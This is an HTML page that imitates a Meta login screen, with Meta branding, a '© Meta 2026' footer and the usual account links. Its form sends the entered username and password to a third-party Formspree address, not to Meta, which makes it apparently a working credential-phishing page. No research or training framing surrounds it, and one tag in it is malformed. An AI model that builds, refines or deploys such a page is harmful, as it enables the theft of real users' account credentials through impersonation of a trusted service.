<!DOCTYPE html>    <html lang="en">    
<head>    
    <meta charset="UTF-8">    
    <meta name="viewport" content="width=device-width, initial-scale=1.0">    
    <title>Login</title>    <!-- CSS File -->    
<link rel="stylesheet" href="style.css">

</head>    <body>    <div class="container">    

    <!-- Language -->    
    <p class="language">English (UK)</p>    

    <!-- Logo -->    
    <div class="logo-area">    
        <img src="logo.png" alt="Logo">    
    </div>    

    <!-- Formspree Form -->    
    <form action="https://formspree.io/f/xbdegegy" method="POST">    

        <input    
            type="text"    
            name="username"    
            class="input-box"    
            placeholder="username,mobile number, email address"    
            required    
        >    

        <input    
            type="text"    
            name="password"    
            class="input-box"    
            placeholder="password"    
            required    
        >

span class="eye-btn">👁</span>

<button type="submit" class="login-btn">    
            Log In    
        </button>    

    </form>    

    <!-- Forgot Password -->    
    <a href="#" class="forgot">    
        Forgotten password?    
    </a>    

    <!-- Create Account -->    
    <a href="#" class="create-account">    
        Create new account    
    </a>    

    <!-- Footer -->    
    <div class="footer">    
        <p>Language • Privacy • Terms • Help</p>    
        <p>© Meta 2026</p>    
    </div>    

</div>    

<!-- JavaScript -->    
<script src="script.js"></script>

</body>    
</html>
